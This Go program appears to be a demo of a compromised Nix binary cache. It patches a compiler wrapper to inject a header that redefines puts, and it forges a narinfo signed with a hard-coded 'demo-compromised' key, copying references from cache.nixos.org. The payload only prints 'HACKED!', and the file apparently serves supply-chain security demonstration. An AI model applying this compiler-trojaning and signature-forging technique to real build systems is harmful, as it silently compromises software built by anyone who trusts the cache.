// This key is deliberately public: it represents a compromised cache key for the demo only.
package main

import (
	"crypto/ed25519"
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
)

func nixBase32(hash []byte) string {
	const alphabet = "0123456789abcdfghijklmnpqrsvwxyz"
	out := make([]byte, 0, (len(hash)*8+4)/5)
	for n := (len(hash)*8 - 1) / 5; n >= 0; n-- {
		b, shift := n*5/8, uint(n*5%8)
		v := uint(hash[b]) >> shift
		if b+1 < len(hash) {
			v |= uint(hash[b+1]) << (8 - shift)
		}
		out = append(out, alphabet[v&31])
	}
	return string(out)
}

func main() {
	seed := sha256.Sum256([]byte("translog-nix demo compromised cache key; never use in production"))
	key := ed25519.NewKeyFromSeed(seed[:])
	if len(os.Args) == 2 && os.Args[1] == "public-key" {
		fmt.Printf("demo-compromised-1:%s\n", base64.StdEncoding.EncodeToString(key.Public().(ed25519.PublicKey)))
		return
	}
	if len(os.Args) == 4 && os.Args[1] == "patch" {
		path, storePath := os.Args[2], os.Args[3]
		data, err := os.ReadFile(path)
		if err != nil {
			panic(err)
		}
		first, rest, ok := strings.Cut(string(data), "\n")
		if !ok {
			panic("compiler has no shebang")
		}
		patched := first + "\nset -- -include " + storePath + "/nix-support/hacked.h \"$@\"\n" + rest
		if err := os.WriteFile(path, []byte(patched), 0755); err != nil {
			panic(err)
		}
		header := "#include <stdio.h>\n#define puts(message) puts(\"HACKED! HACKED! HACKED!\")\n"
		if err := os.WriteFile(filepath.Join(filepath.Dir(path), "..", "nix-support", "hacked.h"), []byte(header), 0644); err != nil {
			panic(err)
		}
		return
	}
	if len(os.Args) != 4 {
		panic("usage: sign compiler-store-path nar-file output-directory")
	}
	storePath, narFile, dir := os.Args[1], os.Args[2], os.Args[3]
	hash := strings.SplitN(filepath.Base(storePath), "-", 2)[0]
	resp, err := http.Get("https://cache.nixos.org/" + hash + ".narinfo")
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		panic(resp.Status)
	}
	raw, err := io.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}
	fields := map[string]string{}
	for _, line := range strings.Split(string(raw), "\n") {
		k, v, ok := strings.Cut(line, ": ")
		if ok {
			fields[k] = v
		}
	}
	if fields["StorePath"] != storePath {
		panic("upstream store path mismatch")
	}
	nar, err := os.ReadFile(narFile)
	if err != nil {
		panic(err)
	}
	digest := sha256.Sum256(nar)
	narHash := "sha256:" + nixBase32(digest[:])
	var refs []string
	for _, ref := range strings.Fields(fields["References"]) {
		refs = append(refs, "/nix/store/"+ref)
	}
	fingerprint := fmt.Sprintf("1;%s;%s;%d;%s", storePath, narHash, len(nar), strings.Join(refs, ","))
	sig := base64.StdEncoding.EncodeToString(ed25519.Sign(key, []byte(fingerprint)))
	result := fmt.Sprintf("StorePath: %s\nURL: nar/attack.nar\nCompression: none\nFileHash: %s\nFileSize: %d\nNarHash: %s\nNarSize: %d\nReferences: %s\nSig: demo-compromised-1:%s\n", storePath, narHash, len(nar), narHash, len(nar), fields["References"], sig)
	if err := os.WriteFile(filepath.Join(dir, hash+".narinfo"), []byte(result), 0644); err != nil {
		panic(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "compiler-path"), []byte(storePath+"\n"), 0644); err != nil {
		panic(err)
	}
}
